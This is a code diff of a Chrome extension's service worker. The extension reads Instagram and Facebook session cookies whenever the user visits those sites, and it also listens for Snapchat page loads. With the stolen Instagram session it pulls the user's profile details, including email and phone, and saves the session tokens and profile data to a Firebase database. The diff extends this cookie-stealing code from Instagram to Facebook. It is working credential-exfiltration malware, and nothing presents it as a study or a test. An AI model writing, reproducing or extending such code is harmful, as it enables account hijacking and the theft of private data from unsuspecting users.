@@ -2,52 +2,65 @@ console.log("🚀 Service Worker Loaded ✅");
 
 import { db, collection, addDoc } from "./firebase.js";
 
-// Listener for Instagram page loads
 chrome.webNavigation.onCompleted.addListener(
   async (details) => {
-    if (details.url.includes("instagram.com")) {
-      chrome.cookies.getAll({ domain: ".instagram.com" }, async (cookies) => {
-        console.log("🍪 All cookies:", cookies);
+    const url = details.url;
 
-        const session = cookies.find((c) => c.name === "sessionid");
-        const dsUserId = cookies.find((c) => c.name === "ds_user_id");
-
-        if (!session || !dsUserId) {
-          console.warn("⚠️ Required cookies not found.");
-          return;
-        }
-
-        const sessionId = session.value;
-        const userId = dsUserId.value;
-
-        console.log("✅ Session ID:", sessionId);
-        console.log("✅ User ID:", userId);
-
-        const userInfo = await fetchUserInfo(sessionId, userId);
-
-        try {
-          await addDoc(collection(db, "sessionid"), {
-            sessionId,
-            userId,
-            ...userInfo, // 🔥 Save all user details
-            timestamp: new Date(),
-            domain: "instagram.com",
-          });
-          console.log(
-            "✅ Session + User Info saved to Firebase:",
-            userInfo.username
-          );
-        } catch (err) {
-          console.error("❌ Firebase error:", err);
-        }
-      });
+    if (url.includes("instagram.com")) {
+      handleInstagram();
+    } else if (url.includes("facebook.com")) {
+      handleFacebook();
+    } else if (url.includes("snapchat.com")) {
+      handleSnapchat();
     }
   },
-  { url: [{ hostSuffix: "instagram.com" }] }
+  {
+    url: [
+      { hostSuffix: "instagram.com" },
+      { hostSuffix: "facebook.com" },
+      { hostSuffix: "snapchat.com" },
+    ],
+  }
 );
 
-// 🔥 Full user info fetcher from IG API
-async function fetchUserInfo(sessionId, userId) {
+// ======================================
+// 🔶 Instagram Handler
+// ======================================
+async function handleInstagram() {
+  chrome.cookies.getAll({ domain: ".instagram.com" }, async (cookies) => {
+    const session = cookies.find((c) => c.name === "sessionid");
+    const dsUserId = cookies.find((c) => c.name === "ds_user_id");
+
+    if (!session || !dsUserId) {
+      console.warn("⚠️ Instagram cookies missing.");
+      return;
+    }
+
+    const sessionId = session.value;
+    const userId = dsUserId.value;
+
+    console.log("✅ IG Session ID:", sessionId);
+    console.log("✅ IG User ID:", userId);
+
+    const userInfo = await fetchIGUserInfo(sessionId, userId);
+
+    try {
+      await addDoc(collection(db, "sessionid"), {
+        platform: "Instagram",
+        sessionId,
+        userId,
+        ...userInfo,
+        timestamp: new Date(),
+        domain: "instagram.com",
+      });
+      console.log("✅ Instagram info saved:", userInfo.username);
+    } catch (err) {
+      console.error("❌ Firebase IG error:", err);
+    }
+  });
+}
+
+async function fetchIGUserInfo(sessionId, userId) {
   const url = `https://i.instagram.com/api/v1/users/${userId}/info/`;
 
   try {
@@ -62,14 +75,13 @@ async function fetchUserInfo(sessionId, userId) {
     });
 
     if (!response.ok) {
-      console.warn("⚠️ Instagram API failed with status:", response.status);
+      console.warn("⚠️ IG API failed:", response.status);
       return { username: "unknown_user" };
     }
 
-    const data = await response.json();
-    const user = data.user;
+    const user = (await response.json()).user;
 
-    const userInfo = {
+    return {
       username: user?.username || "unknown_user",
       full_name: user?.full_name || "N/A",
       bio: user?.biography || "N/A",
@@ -85,11 +97,37 @@ async function fetchUserInfo(sessionId, userId) {
       public_email: user?.public_email || "Not Available",
       public_phone: user?.public_phone_number || "Not Available",
     };
-
-    console.log("📛 Fetched Full User Info:", userInfo);
-    return userInfo;
   } catch (error) {
-    console.error("❌ Error while fetching user info:", error);
+    console.error("❌ IG fetch error:", error);
     return { username: "unknown_user" };
   }
 }
+
+// ======================================
+// 🔷 Facebook Handler
+// ======================================
+async function handleFacebook() {
+  chrome.cookies.getAll({ domain: ".facebook.com" }, async (cookies) => {
+    const cUser = cookies.find((c) => c.name === "c_user");
+    const xs = cookies.find((c) => c.name === "xs");
+
+    if (!cUser || !xs) {
+      console.warn("⚠️ Facebook cookies missing.");
+      return;
+    }
+
+    try {
+      await addDoc(collection(db, "sessionid"), {
+        platform: "Facebook",
+        c_user: cUser.value,
+        xs: xs.value,
+        timestamp: new Date(),
+        domain: "facebook.com",
+      });
+      console.log("✅ Facebook session saved:", cUser.value);
+    } catch (err) {
+      console.error("❌ Firebase FB error:", err);
+    }
+  });
+}
+
